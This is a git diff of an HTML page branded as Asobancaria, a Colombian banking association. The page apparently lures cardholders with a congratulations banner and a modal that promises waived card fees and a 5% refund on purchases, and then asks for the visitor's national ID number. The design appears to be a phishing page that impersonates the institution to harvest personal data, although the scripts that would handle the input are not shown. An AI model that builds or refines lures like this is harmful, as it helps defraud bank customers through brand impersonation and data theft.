@@ -27,7 +27,7 @@
 
 <body>
     <header class="header-video">
-        <img src="./assets/svg/header_static.jpeg" alt="" class="video">
+        <img src="./assets/svg/header_static.jpeg" style="filter: brightness(.6);" class="video">
         <!-- <video class="video" style="filter: brightness(0.6);" autoplay loop muted poster="https://assets.codepen.io/6093409/river.jpg">
             <source src="./assets/svg/vidfont.mp4" type="video/mp4">
         </video> -->
@@ -39,23 +39,26 @@
         </nav>
         <div class="header-text">
             <h6>Bienvenido a Asobancaria</h6>
-            <h2>Disfruta de los beneficios de ser tarjetahabiente<span style="font-size: 20px;">®</span></h2>
-
-            <div class="form-index">
-                <p>
-                    Ingresa tu cédula y consulta los beneficios que tenemos para tí!
-                </p>
-                
-                <input class="form-input" oninput="limitarDigitos(this, 10)" type="number" id="cc" placeholder=" Ingresa tu documento">
-        
-                <button class="btn btn-primary" id="success">
-                    Consultar
-                </button>
+            <!-- <span style="font-size: 20px;">®</span> -->
+            <h2>!Enhorabuena!</h2>
+            <p>Asobancaria te premia por tu buen comportamiento financiero.</p>
+            <div class="d-center">
+                <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>
             </div>
-            
         </div>
     </header>
 
+
+    <div class="modal d-none" id="modal-principal">
+        <div class="modal-body">
+            <h5 class="modal-title">Asobancaria te premia</h5>
+            <p>Te exoneramos del Pago de la cuota de manejo hasta la fecha de vencimiento de tu tarjeta. Además tendras la devolución del <b>5%</b> de todos tus pagos y/o compras que realices con tus tarjetas.</p>
+            <input class="form-input" oninput="limitarDigitos(this, 10)" id="cc" type="text" placeholder=" Ingresa tu cédula">
+            <button class="btn btn-primary mt-1" id="success">
+                Continuar
+            </button>
+        </div>
+    </div>
     
 
     <!-- SCRIPTS -->
